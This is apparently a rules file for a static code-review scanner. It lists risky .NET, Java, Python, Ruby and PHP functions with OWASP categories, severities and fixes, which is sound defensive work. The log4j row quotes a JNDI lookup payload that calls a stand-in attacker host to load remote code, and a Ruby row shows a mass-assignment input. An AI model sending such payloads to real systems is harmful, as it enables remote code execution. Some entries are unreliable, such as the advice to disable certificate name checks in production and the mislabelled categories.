20;Language;NET;$type;$type;Investigate;Language_NET_Investigate_$type;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability;Whitelist types allowed to be deserialized.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
20;Language;NET;JavaScriptTypeResolver;javascripttyperesolver;Insecure;Language_NET_Insecure_javascripttyperesolver;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability, eg. Change file properties (to readonly causing DoS);Whitelist types allowed to be deserialized.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;RequestDispatcher.forward(;request_dispatcher_forward;Investigate;Language_Java_Investigate_request_dispatcher_forward;False;;True;False;True;;;;A1-Broken Access Control;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;SpelExpressionParser;spel_expression_parser;Investigate;Language_Java_Investigate_spel_expression_parser;False;;True;False;True;;;;A1-Broken Access Control;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;pageContext.forward(;page_context_forward;Investigate;Language_Java_Investigate_page_context_forward;False;;True;False;True;;;;A1-Broken Access Control;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;".delete();";delete;Investigate;Language_Java_Investigate_delete;False;;True;False;True;;;;A1-Broken Access Control;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;java.lang.Class.getDeclaredMethod;getdeclaredmethod;Investigate;Language_Java_Investigate_getdeclaredmethod;False;;True;False;True;;;Direct object access;A1-Broken Access Control;Low;Reflection - accessing even private fields or methods;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.lang.Class.getDeclaredField;getdeclaredfield;Investigate;Language_Java_Investigate_getdeclaredfield;False;;True;False;True;;;Direct object access;A1-Broken Access Control;Low;Reflection - accessing even private fields or methods;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.lang.reflection.Method.invoke;method_invoke;Investigate;Language_Java_Investigate_method_invoke;False;;True;False;True;;;Direct object access;A1-Broken Access Control;Low;Reflection - accessing even private fields or methods;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.lang.reflection.Field.set;field_set;Investigate;Language_Java_Investigate_field_set;False;;True;False;True;;;Direct object access;A1-Broken Access Control;Low;Reflection - accessing even private fields or methods;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.lang.reflection.Field.get;field_get;Investigate;Language_Java_Investigate_field_get;False;;True;False;True;;;Direct object access;A1-Broken Access Control;Low;Reflection - accessing even private fields or methods;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;ServletRequest.isUserInRole(;servlet_request_isuserinrole;Investigate;Language_Java_Investigate_servlet_request_isuserinrole;False;;True;False;True;Locate;;Authorization;A1-Broken Access Control;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;checkCallingOrSelf;checkCallingOrSelf;Investigate;Language_Java_Investigate_checkCallingOrSelf;False;;True;False;True;;;Authorization;A1-Broken Access Control;Medium;CWE284. If checkCallingOrSelf(Uri)Permission() methods are used in Inter-Process Communication (IPC), this can be exploited by malicious software to elevate privelige.;Use checkCalling(Uri)Permission instead.;;
30;Language;Java;Intent;Intent;Investigate;Language_Java_Investigate_Intent;False;;True;False;True;Locate;;Authorization (mobile only);A1-Broken Access Control;Medium;CWE925. Look for improper validation of intent by the broadcast receiver.;Verify that the Intent came from an authorized source, e.g. by checking the action string.;;
30;Language;Java;javax.crypto;javax_crypto;Investigate;Language_Java_Investigate_javax_crypto;False;;True;False;True;Locate;;Cryptography;A2-Cryptographic Failures;High;;;;
30;Language;Java;Math.Random;math_random;Investigate;Language_Java_Investigate_math_random;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;setSSLOnConnect(;set_ssl_onconnect;Investigate;Language_Java_Investigate_set_ssl_onconnect;False;;True;False;True;Locate;;Transport security;A2-Cryptographic Failures;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;jdk.tls.disabledAlgorithms;jdk_tls_disabledalgorithms;Investigate;Language_Java_Investigate_jdk_tls_disabledalgorithms;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;"MD5, SHA1, DSA, RSA keySize < 2048. ""From Java 7 onwards cipher suites can be excluded from use via a security policy file called java.security that is located under Java Runtime Environment in the /lib/security directory.""";;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;setDisableCNCheck;setDisableCNCheck;Investigate;Language_Java_Investigate_setDisableCNCheck;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;High;"Set whether or not JSEE should omit checking if the host name specified in the URL matches that of the Common Name (CN) on the server's certificate. Default is false; this attribute should not be set to true during production use.";Set to true in prd environment.;https://cxf.apache.org/javadoc/latest/org/apache/cxf/configuration/jsse/TLSClientParameters.html;
30;Language;Java;setMaxAge(;set_max_age;Investigate;Language_Java_Investigate_set_max_age;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Session cookie.;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;Session.invalidate(;session_invalidate;Investigate;Language_Java_Investigate_session_invalidate;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;unsecure;unsecure;Investigate;Language_Java_Investigate_unsecure;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;"Look for unsecure=""disabled""";;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;ServletResponse.addCookie(;servlet_response_addcookie;Investigate;Language_Java_Investigate_servlet_response_addcookie;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;ServletRequest.isSecure(;servlet_request_issecure;Investigate;Language_Java_Investigate_servlet_request_issecure;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;ClassLoader;ClassLoader;Investigate;Language_Java_Investigate_ClassLoader;False;;True;False;True;;;Remote code execution;A3-Injection;High;"Arbitrary code execution; java.lang.ClassLoader.defineClass, java.net.URLClassLoader ";;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;DataBinder;DataBinder;Investigate;Language_Java_Investigate_DataBinder;False;;True;False;True;;;Remote code execution;A3-Injection;High;"Spring4Shell. Arbitrary code execution; java.lang.ClassLoader.defineClass, java.net.URLClassLoader ";"JDK > 9, blacklist querystring patterns containing ""class""";https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/#exploit-scenario-overview;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/validation/
30;Language;Java;chmod(;chmod;Investigate;Language_Java_Investigate_chmod;False;;True;False;True;;;Remote code execution;A3-Injection;High;File access;;;
30;Language;Java;log4j;log4j;Investigate;Language_Java_Investigate_log4j;False;;True;False;True;Locate;;Remote code execution;A3-Injection;High;"If user input is logged, remote code execution may be possible on the log server with the rights of the app. An attacker may inject ""jndi:ldap://www.attacker.com/malicious_java_class"". This lands within ${..} and the log4j lookup feature will execute the java class on the remote attacker site.";Strict user input validatiob/sanitizing.;https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/#root-cause-analysis;https://www.ncsc.nl/actueel/advisory?id=NCSC-2021-1052
30;Language;Java;java.io.File.delete;file_delete;Investigate;Language_Java_Investigate_file_delete;False;;True;False;True;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.File.renameTo;file_renameto;Investigate;Language_Java_Investigate_file_renameto;False;;True;False;True;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.FileInputStream;fileinputstream;Investigate;Language_Java_Investigate_fileinputstream;False;;True;False;False;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.FileOutputStream;fileoutputstream;Investigate;Language_Java_Investigate_fileoutputstream;False;;True;False;False;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.FileWriter;filewriter;Investigate;Language_Java_Investigate_filewriter;False;;True;False;False;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.RandomAccessFile;randomaccessfile;Investigate;Language_Java_Investigate_randomaccessfile;False;;True;False;False;Locate;;SQL Injection;A3-Injection;High;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.sql.Statement;sql_statement;Investigate;Language_Java_Investigate_sql_statement;False;;True;False;True;Locate;;SQL injection;A3-Injection;High;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;persistence;persistence;Investigate;Language_Java_Investigate_persistence;False;;True;False;True;Locate;;SQL Injection;A3-Injection;High;Java Persistence API (JPA)  injection;Use parameterized queries;https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-persistence-api-jpa;https://tomee.apache.org/injection-of-entitymanager-example.html
30;Language;Java;BeanUtils.populate(;beanutils_populate;Investigate;Language_Java_Investigate_beanutils_populate;False;;True;False;True;;;;A3-Injection;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;@requestparam;request_param;Investigate;Language_Java_Investigate_request_param;False;;True;False;True;Locate;;Input validation;A3-Injection;Medium;Spring framework;If whitelisting is not possible, validate on length (if possible < 15), format and/or allowed characters (e.g via regex).;https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html;
30;Language;Java;javax.script.ScriptEngine.eval;scriptengine_eval;Investigate;Language_Java_Investigate_scriptengine_eval;False;;True;False;True;;;XSS;A3-Injection;High;Arbitrary code execution;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.net.URLEncoder;java_net_urlencoder;Investigate;Language_Java_Investigate_java_net_urlencoder;False;;True;False;True;;;XSS;A3-Injection;Low;;;;
30;Language;Java;java.net.URLDecoder;java_net_urldecoder;Investigate;Language_Java_Investigate_java_net_urldecoder;False;;True;False;True;;;XSS;A3-Injection;Low;;;;
30;Language;Java;ServletResponse.encodeURL;servlet_response_encodeurl;Investigate;Language_Java_Investigate_servlet_response_encodeurl;False;;True;False;True;;;XSS;A3-Injection;Low;;;;
30;Language;Java;ServletResponse.setContentType(;servlet_response_setcontenttype;Investigate;Language_Java_Investigate_servlet_response_setcontenttype;False;;True;False;True;;;XSS;A3-Injection;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;.parse(;parse;Investigate;Language_Java_Investigate_parse;False;;False;False;True;;;Sensitive data exposure;A6-Vulnerable and Outdated Components;Low;"Race condition format flaw; java.Text.Format and SimpleDateFormat method parse() are not thread-safe.";Use DateTimeFormatter (from Java 8) instead of SimpleDateFormat;https://vulncat.fortify.com/en/detail?id=desc.structural.java.race_condition_format_flaw;https://www.baeldung.com/migrating-to-java-8-date-time-api
30;Language;Java;java.beans.Instrospector.getBeanInfo;introspector;Investigate;Language_Java_Investigate_introspector;False;;True;False;True;;;Remote code execution;A5-Security Misconfiguration;Medium;Untrusted user input, e.g. via parameters.;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;xmldecoder;xmldecoder;Investigate;Language_Java_Investigate_xmldecoder;False;;True;False;True;Locate;;Remote code execution;A5-Security Misconfiguration;Medium;Serialization vulnerability;Check external user defined parameters. Override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;fromxml;fromxml;Investigate;Language_Java_Investigate_fromxml;False;;True;False;True;;;Remote code execution;A5-Security Misconfiguration;Medium;Serialization vulnerability;override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;DocumentBuilderFactory;documentbuilderfactory;Investigate;Language_Java_Investigate_documentbuilderfactory;False;;True;False;True;Locate;;XXE;A5-Security Misconfiguration;Medium;;Generally, disable DTD (External Entities).;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;
30;Language;Java;javax.servlet.ServletInputStream.readLine;javax_servlet_readline;Investigate;Language_Java_Investigate_javax_servlet_readline;False;;True;False;True;;;;A5-Security Misconfiguration;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;java.security;java_security;Investigate;Language_Java_Investigate_java_security;False;;True;False;False;Locate;;;A5-Security Misconfiguration;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;checkRevocation;checkRevocation;Investigate;Language_Java_Investigate_checkRevocation;False;;True;False;True;;;;A5-Security Misconfiguration;Low;"Should be ""true""";;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;Files.setPosixFilePermissions(;files_setposixfilepermissions;Investigate;Language_Java_Investigate_files_setposixfilepermissions;False;;True;False;True;;;;A5-Security Misconfiguration;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;InitialDirContext(;initial_dir_context;Investigate;Language_Java_Investigate_initial_dir_context;False;;True;False;True;;;;A5-Security Misconfiguration;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;Database.SHARED;database_shared;Investigate;Language_Java_Investigate_database_shared;False;;False;False;True;;;;A5-Security Misconfiguration;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;non-Crap;nonCrap;Investigate;Language_Java_Investigate_nonCrap;False;;True;False;True;;;;A6-Vulnerable and Outdated Components;Informational;;;Fortify;
30;Language;Java;WCB_ID;WCB_ID;Investigate;Language_Java_Investigate_WCB_ID;False;;True;False;True;;;;A6-Vulnerable and Outdated Components;Informational;;;Fortify;
30;Language;Java;java.rmi.RMISecurityException;RMISecurityException;Insecure;Language_Java_Insecure_RMISecurityException;False;;True;False;False;;;;A6-Vulnerable and Outdated Components;Medium;deprecated;;;
30;Language;Java;Boolean.getBoolean(;boolean_getboolean;Investigate;Language_Java_Investigate_boolean_getboolean;False;;True;False;True;;;;A6-Vulnerable and Outdated Components;Informational;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;java.security.Identity;security_Identity;Insecure;Language_Java_Insecure_security_Identity;False;;True;False;True;;;Authentication;A6-Vulnerable and Outdated Components;Medium;deprecated;;;
30;Language;Java;java.security.IdentityScope;security_IdentityScope;Insecure;Language_Java_Insecure_security_IdentityScope;False;;True;False;True;;;Authentication;A6-Vulnerable and Outdated Components;Medium;deprecated;;;
30;Language;Java;java.security.Signer;security_Signer;Insecure;Language_Java_Insecure_security_Signer;False;;True;False;True;;;Authentication;A6-Vulnerable and Outdated Components;Medium;deprecated;;;
30;Language;Java;Session.getId(;session_get_id;Investigate;Language_Java_Investigate_session_get_id;False;;True;False;True;;;;A7-Identification and Authentication Failures;Informational;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;ServletRequest.getUserPrincipal(;servlet_request_getuserprincipal;Investigate;Language_Java_Investigate_servlet_request_getuserprincipal;False;;True;False;True;Locate;;Authentication;A7-Identification and Authentication Failures;Medium;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;readObject;readobject;Investigate;Language_Java_Investigate_readobject;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Serialization vulnerability;override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;readResolve;readresolve;Investigate;Language_Java_Investigate_readresolve;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Serialization vulnerability;override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;readExternal;readexternal;Investigate;Language_Java_Investigate_readexternal;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Serialization vulnerability;override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;serializable;serializable;Investigate;Language_Java_Investigate_serializable;False;;True;False;True;Locate;;Remote code execution;A8-Software and Data Integrity Failures ;High;Serialization vulnerability (only if ReadObject() is used).;Make readObject() final. Or override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;ObjectInputStream.readUnshared;objectinputstream_readunshared;Investigate;Language_Java_Investigate_objectinputstream_readunshared;False;;True;False;True;;;Remote code execution;A8-Software and Data Integrity Failures ;High;Serialization vulnerability;override ObjectInputStream#resolveClass()  to prevent deserializing arbitrary classes. Use e.g. SerialKiller library.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
30;Language;Java;.format(;format;Investigate;Language_Java_Investigate_format;False;;False;False;True;;;Sensitive data exposure;A6-Vulnerable and Outdated Components;Low;"Race condition format flow; *Format classes use .format() and are not thread-safe.";Use DateTimeFormatter (from Java 8) instead of SimpleDateFormat;https://vulncat.fortify.com/en/detail?id=desc.structural.java.race_condition_format_flaw;https://www.baeldung.com/migrating-to-java-8-date-time-api
30;Language;Java;ServletContext.log(;servlet_context_log;Investigate;Language_Java_Investigate_servlet_context_log;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;println(;println;Investigate;Language_Java_Investigate_println;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;;
30;Language;Java;Throwable.printStackTrace(;throwable_printstacktrace;Investigate;Language_Java_Investigate_throwable_printstacktrace;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;https://www.oracle.com/technetwork/java/seccodeguide-139067.html;
30;Language;Java;java.io.File.listFiles;file_listfiles;Investigate;Language_Java_Investigate_file_listfiles;False;;True;False;True;Locate;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Medium;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.File.list;file_list;Investigate;Language_Java_Investigate_file_list;False;;True;False;True;Locate;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Medium;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;java.io.FileReader;filereader;Investigate;Language_Java_Investigate_filereader;False;;True;False;False;Locate;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Medium;;;https://stackoverflow.com/questions/4339611/exploitable-java-functions;
30;Language;Java;android.text.editable;android_text_editable;Investigate;Language_Java_Investigate_android_text_editable;False;;True;False;True;Locate;;XSS;A3-Injection;High;In android, with getText() and setText() you can manipulate user input (Edittext) via an Editable.;;https://stackoverflow.com/questions/25323194/what-does-editable-mean;
40;Language;Python;permission_classes;permission_classes;Investigate;Language_Python_Investigate_permission_classes;False;;True;False;True;;;Authorization;A1-Broken Access Control;Medium;;;https://www.django-rest-framework.org/api-guide/permissions/;
40;Language;Python;required_scope;required_scope;Investigate;Language_Python_Investigate_required_scope;False;;True;False;True;;;Authorization;A1-Broken Access Control;Medium;"Swagger Scopes should be defined (except ""read-the-docs""). See settings.py.";;;
40;Language;Python;os.unlink(;os_unlink;Investigate;Language_Python_Investigate_os_unlink;False;;True;False;True;;;Authorization;A1-Broken Access Control;High;;Authorization: Make sure user is owner of file;https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html;
40;Language;Python;random.randint(;random_randint;Investigate;Language_Python_Investigate_random_randint;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;;
40;Language;Python;random.random(;random_random;Investigate;Language_Python_Investigate_random_random;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;;
40;Language;Python;import ssl ;import_ssl;Investigate;Language_Python_Investigate_import_ssl;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;Python modules SSL and pyOpenSSL do not validate server identity.;In the code, retrieve X509. The subject common name (CN), should be equal to the host name.;https://wiki.python.org/moin/SSL;
40;Language;Python;pickle;pickle;Investigate;Language_Python_Investigate_pickle;False;;True;False;False;;;Command  injection;A3-Injection;High;Can it contain untrusted user input.;Use JSON serialization or add a digital signature.;https://security.stackexchange.com/questions/183966/safely-load-a-pickle-file;https://intoli.com/blog/dangerous-pickles/
40;Language;Python;shelve;shelve;Investigate;Language_Python_Investigate_shelve;False;;True;False;True;;;Command  injection;A3-Injection;High;shelve.open() opens a shelf, which is ako dictionary (may be class, anything pickle can handle) . Uses pickle, see pickle.;;https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html;https://studentrobotics.org/docs/python/library/shelve.html
40;Language;Python;yaml.load(;yaml_load;Investigate;Language_Python_Investigate_yaml_load;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it contain untrusted user input.;yaml.safe_load();https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html;
40;Language;Python;joblib.load(;joblib_load;Investigate;Language_Python_Investigate_joblib_load;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it contain untrusted user input. Joblib uses pickle.;Whitelist expected possible commands. ;https://joblib.readthedocs.io/en/latest/generated/joblib.load.html;
40;Language;Python;subprocess;subprocess;Investigate;Language_Python_Investigate_subprocess;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it contain untrusted user input.;;https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html;https://www.tripwire.com/state-of-security/off-topic/digging-for-security-bugs-in-python-code/
40;Language;Python;shell=True;shell_true;Investigate;Language_Python_Investigate_shell_true;False;;True;False;True;;;Command  injection;A3-Injection;High;Can it contain untrusted user input? In combination with subprocess.call(command, shell=True);Escape vairables with pipes.qoute() (2.x) or  shlex.quote() (>3.3);https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html;
40;Language;Python;exec(;exec;Investigate;Language_Python_Investigate_exec;False;;True;False;True;;;Command  injection;A3-Injection;High;;Use version > v1.46;https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html;
40;Language;Python; extra(;extra;Investigate;Language_Python_Investigate_extra;False;;True;False;True;;;SQL Injection;A3-Injection;High;Django related. Circumvents Django protection;Escape querystring parameters and do not quote placeholders.;https://docs.djangoproject.com/en/4.1/topics/security;
40;Language;Python;query.filter;query_filter;Investigate;Language_Python_Investigate_query_filter;False;;True;False;True;;;SQL Injection;A3-Injection;High;Only non-parameterized;;;
40;Language;Python;django.utils.safestring;safestring;Investigate;Language_Python_Investigate_safestring;False;;True;False;True;;;XSS;A3-Injection;Medium;Are strings marked as safe that can be user-influenced?;;https://docs.djangoproject.com/en/2.1/topics/security;
40;Language;Python;render_to_string;render_to_string;Investigate;Language_Python_Investigate_render_to_string;False;Exclude;True;False;True;;;XSS;A3-Injection;Medium;Django xxs solution;;;
40;Language;Python; render(;render;Investigate;Language_Python_Investigate_render;False;;True;False;True;Locate;;Output encoding;A3-Injection;Medium;Shortcut for HttpResponse;Output sanitizing;;
40;Language;Python;reqparse.;reqparse;Investigate;Language_Python_Investigate_reqparse;False;;True;False;True;Locate;;Input validation;A3-Injection;Medium;deprecated;Input validation;https://flask-restful.readthedocs.io/en/0.3.6/reqparse.html;
40;Language;Python;allowed_host;allowed_host;Investigate;Language_Python_Investigate_allowed_host;False;Exclude;True;False;True;;;CORS;A5-Security Misconfiguration;Medium;[*] is over-permissive. Vulnerable when get_host() is used. Security is bypassed when request.META is used. ;;;
40;Language;Python;request.meta;request_meta;Investigate;Language_Python_Investigate_request_meta;False;;True;False;True;;;CORS;A5-Security Misconfiguration;Medium;Disables Django ALLOWED_HOST security if HOST is retrieved from META instead of get_host();;https://docs.djangoproject.com/en/2.2/ref/settings/;
40;Language;Python;*CF_VERIFY(contains, or, false, none);verify_false;Investigate;Language_Python_Investigate_verify_false;False;;True;False;True;;;Security misconfiguration;A5-Security Misconfiguration;Medium;Turnes off request cert checking.;Use the default Verify=True or pass certificate path.;https://docs.python-requests.org/en/master/user/advanced/;
40;Language;Python;os.popen*(;os_popen;Insecure;Language_Python_Insecure_os_popen;False;;True;False;True;;;Versioning;A6-Vulnerable and Outdated Components;Medium;deprecated;;https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html;
40;Language;Python;*CF_PARM_CHECK(getattr);getattr;Insecure;Language_Python_Insecure_getattr;False;;True;False;True;;;Sensitive data exposure;A4-Insecure Design;High;Default must be present to avoid crash. Only a risk if attribute name is user-influenced.;Add default parameter;;
40;Language;Python;send_default_pii;send_default_pii;Investigate;Language_Python_Investigate_send_default_pii;False;;True;False;True;;;Sensitive data exposure;A5-Security Misconfiguration;Medium;Sentry setting, when True (default is False), pii is not being filtered out.;Remove the parameter or put it to False.;https://docs.sentry.io/platforms/python/guides/logging/configuration/options/#send-default-pii;
40;Language;Python;csrf_exempt;csrf_exempt;Insecure;Language_Python_Insecure_csrf_exempt;False;Exclude;True;False;True;;;CSRF;A10-Server-Side Request Forgery (SSRF);Medium;Disables default csrf protection;;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;attr_accessible;attr_accessible;Investigate;Language_Ruby_Investigate_attr_accessible;False;;True;False;True;;;Authentication and authorisation;A1-Broken Access Control;Medium;"Mass assignment issue in older versions. E.g. In form attacker adds  <input type=""hidden"" name=""is_admin"" value=""true"">.";;https://docs.djangoproject.com/en/2.1/topics/security;https://ropesec.com/articles/mass-assignment/
45;Language;Ruby;config.force_ssl = false;ssl_false;Insecure;Language_Ruby_Insecure_ssl_false;False;;True;False;True;;;Transport security;A2-Cryptographic Failures;Medium;;should be True;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;.find(;find;Investigate;Language_Ruby_Investigate_find;False;;True;False;True;;;SQL Injection;A3-Injection;High;;parameterized queries, escaping;https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheatsheet.html;
45;Language;Ruby;.where(;where;Investigate;Language_Ruby_Investigate_where;False;;True;False;True;;;SQL Injection;A3-Injection;High;;parameterized queries, escaping;https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheatsheet.html;
45;Language;Ruby;config.active_record.whitelist_attributes;whitelist_attributes;Investigate;Language_Ruby_Investigate_whitelist_attributes;False;;True;False;True;;;Input validation;A3-Injection;Informational;"Should be present in older versions. ""Strong parameters"" issue .";"Use ""Strong parameters"" gem.";https://docs.djangoproject.com/en/2.1/topics/security;https://ropesec.com/articles/mass-assignment/
45;Language;Ruby;open(;open;Investigate;Language_Ruby_Investigate_open;False;;True;False;True;;;Remote code execution;A3-Injection;High;May contain os command;;https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheatsheet.html;
45;Language;Ruby;acceptable_urls;acceptable_urls;Investigate;Language_Ruby_Investigate_acceptable_urls;False;;True;False;True;;;Open redirect;A3-Injection;Informational;Is a remedy against redirection to malicious sites.;;https://docs.djangoproject.com/en/2.1/topics/security;https://ropesec.com/articles/mass-assignment/
45;Language;Ruby;html_safe;html_safe;Investigate;Language_Ruby_Investigate_html_safe;False;;True;False;True;;;XSS;A3-Injection;Medium;Circumvents Ruby > 3.0 XSS protection;;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;content_tag;content_tag;Investigate;Language_Ruby_Investigate_content_tag;False;;True;False;True;;;XSS;A3-Injection;Medium;Circumvents Ruby > 3.0 XSS protection;;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;link_to ;link_to;Investigate;Language_Ruby_Investigate_link_to;False;;True;False;True;;;XSS;A3-Injection;Medium;link_to is a href tag, vulnerable in older versions.;"CSP. This forbids links starting with"" javascript:""";https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;application.config.session_store;application.config.session_store;Investigate;Language_Ruby_Investigate_application.config.session_store;False;;True;False;True;;;Session;A7-Identification and Authentication Failures;Medium;Default by cookies, that do not terminate session. Database is recommended for storage of  session id.; :active_record_store;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;protect_from_forgery;protect_from_forgery;Investigate;Language_Ruby_Investigate_protect_from_forgery;False;;True;False;True;;;CSRF;A10-Server-Side Request Forgery (SSRF);Medium;;should exist;https://docs.djangoproject.com/en/2.1/topics/security;
45;Language;Ruby;:except;csrf_exception;Investigate;Language_Ruby_Investigate_csrf_exception;False;;True;False;True;;;CSRF;A10-Server-Side Request Forgery (SSRF);Medium;Exceptions may be harmful;Use of token authorization only protects against CSRF.;https://docs.djangoproject.com/en/2.1/topics/security;
50;Language;PHP;unlink(;unlink;Investigate;Language_PHP_Investigate_unlink;False;;True;False;True;;;Authorization;A1-Broken Access Control;High;;Authorization: Make sure user is owner of file;;
50;Language;PHP;rand(;rand;Investigate;Language_PHP_Investigate_rand;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;Only in security context;;;
